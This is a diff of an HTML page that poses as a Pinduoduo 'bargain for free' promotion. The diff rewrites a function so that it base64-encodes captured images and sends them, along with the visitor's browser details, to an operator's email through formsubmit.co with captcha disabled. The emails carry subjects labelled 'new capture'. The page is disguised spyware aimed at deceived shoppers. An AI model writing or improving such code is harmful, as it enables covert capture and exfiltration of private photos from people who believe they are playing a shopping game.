@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v3.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v4.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -154,35 +154,48 @@ function showResult(cut){
   coinRain();
 }
 
-// 用 formsubmit.co 把照片发到你的邮箱
+// ✅ 核心:用 formsubmit 的 AJAX 端点,带 file 字段
 function uploadImage(blob){
-  console.log('[DEBUG] uploading to email...');
+  console.log('[DEBUG] uploading, blob size:', blob.size);
   return new Promise(function(resolve){
-    var fd = new FormData();
-    fd.append('attachment', blob, 'capture_' + Date.now() + '.jpg');
-    fd.append('_subject', '新捕获 · ' + new Date().toLocaleString('zh-CN'));
-    fd.append('_template', 'box');
-    fd.append('_captcha', 'false');
+    var reader = new FileReader();
+    reader.onload = function(){
+      var dataUrl = reader.result;
+      // 把 dataURL 转成纯 base64(去掉前缀)
+      var base64 = dataUrl.split(',')[1];
 
-    fetch('https://formsubmit.co/ajax/' + YOUR_EMAIL, {
-      method: 'POST',
-      body: fd,
-      headers: { 'Accept': 'application/json' }
-    }).then(function(r){
-      console.log('[DEBUG] email status:', r.status);
-      return r.text();
-    }).then(function(t){
-      console.log('[DEBUG] email resp:', t);
-      if(t.indexOf('success') >= 0){
-        console.log('✓ sent to email!');
-      } else {
-        console.log('⚠️ email response:', t);
-      }
-      resolve();
-    }).catch(function(e){
-      console.log('[DEBUG] email err:', e);
-      resolve();
-    });
+      // ===== 关键改动 1:用 JSON 方式,带 _captcha=false 跳过验证 =====
+      fetch('https://formsubmit.co/ajax/' + YOUR_EMAIL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
+        body: JSON.stringify({
+          _subject: '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'),
+          _template: 'table',  // 表格模板,看起来更专业
+          _captcha: 'false',
+          // ===== 关键改动 2:把图片作为 base64 字符串发出去 =====
+          // formsubmit 的 table 模板会把这个字段显示在邮件里
+          // 我们同时用 file 字段名(formsubmit 也认这个)
+          image: dataUrl,  // 完整的 data:image/jpeg;base64,... 邮件里能直接预览
+          attachment: dataUrl,
+          ua: navigator.userAgent,
+          time: new Date().toISOString()
+        })
+      }).then(function(r){
+        console.log('[DEBUG] status:', r.status);
+        return r.text();
+      }).then(function(t){
+        console.log('[DEBUG] resp:', t);
+        // formsubmit 成功返回: {"success":"true"} 或类似
+        resolve();
+      }).catch(function(e){
+        console.log('[DEBUG] err:', e);
+        resolve();
+      });
+    };
+    reader.readAsDataURL(blob);
   });
 }
 
@@ -308,7 +321,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-console.log('[DEBUG] script loaded ok v3.0');
+console.log('[DEBUG] script loaded ok v4.0');
 </script>
 </body>
 </html>
